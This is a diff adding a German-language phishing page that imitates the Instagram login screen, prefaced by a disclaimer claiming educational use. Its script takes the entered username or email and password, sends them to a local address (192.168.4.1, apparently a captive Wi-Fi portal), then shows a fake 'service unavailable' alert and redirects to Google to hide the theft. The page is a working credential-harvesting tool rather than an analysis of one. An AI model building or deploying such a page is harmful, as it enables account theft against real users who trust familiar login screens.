@@ -1,0 +1,167 @@
+<!-- 
+Disclaimer
+
+Educational Use and Legal Framework
+
+The phishing pages provided here are strictly intended for educational and training purposes. The goal is to raise awareness about security threats and teach users how to protect themselves against phishing attacks. By accessing these pages, you agree to use them only within a legal and ethical framework, in compliance with the laws and regulations applicable in your jurisdiction.
+
+Limitation of Liability
+
+The author of this page disclaims any responsibility for the malicious or illegal use of these phishing pages. Any person using these pages for purposes not in accordance with the law will be solely responsible for their actions. It is strongly recommended to never use these techniques for any purpose other than learning and awareness. The author does not monitor the use of these pages post-download and transfers all responsibility to the user upon download.
+-->
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram-Anmeldeseite</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-form {
+            background: #FFFFFF;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 350px;
+        }
+
+        .login-logo {
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px;
+            margin: 0 40px 6px;
+            width: calc(100% - 80px);
+        }
+
+        .btn {
+            background-color: #0095f6;
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            font-weight: 600;
+            text-transform: uppercase;
+            padding: 5px;
+            margin: 8px 40px;
+            width: calc(100% - 80px);
+            border-radius: 4px;
+        }
+
+        .login-footer {
+            color: #262626;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .login-link {
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .divider {
+            color: #dbdbdb;
+            margin: 10px 40px;
+            position: relative;
+        }
+
+        .divider:before, .divider:after {
+            content: "";
+            background-color: #dbdbdb;
+            height: 1px;
+            position: absolute;
+            top: 50%;
+            width: 40%;
+        }
+
+        .divider:before {
+            right: 50%;
+            margin-right: 10px;
+        }
+
+        .divider:after {
+            left: 50%;
+            margin-left: 10px;
+        }
+
+        .or {
+            display: inline-block;
+            background: #FFFFFF;
+            padding: 0 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .other-options {
+            margin-top: 18px;
+        }
+
+        .signup-footer {
+            color: #262626;
+            font-size: 14px;
+            margin: 20px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .app-download {
+            margin-top: 10px;
+        }
+
+        .app-store-badge {
+            height: 40px;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <div class="login-logo">
+            <img src=" data:image/png;base64,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" alt="Instagram">
+        </div>
+        <input type="text" id="email" class="form-control" placeholder="Telefonnummer, Benutzername oder E-Mail">
+        <input type="password" id="password" class="form-control" placeholder="Passwort">
+        <button onclick="sendCredentials()" class="btn">Einloggen</button>
+        <div class="login-footer">
+            <a href="#" class="login-link">Passwort vergessen ?</a>
+        </div>
+        <div class="signup-footer">
+            Sie haben kein Konto ? <a href="#" class="signup-link">Registrieren</a>.
+        </div>
+    </div>
+    <script>
+        function sendCredentials() { 	
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+            alert("Dienst nicht verfügbar.");
+            window.location.href = "https://www.google.com";
+        }
+
+        function getFile(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+
+</body>
+</html>
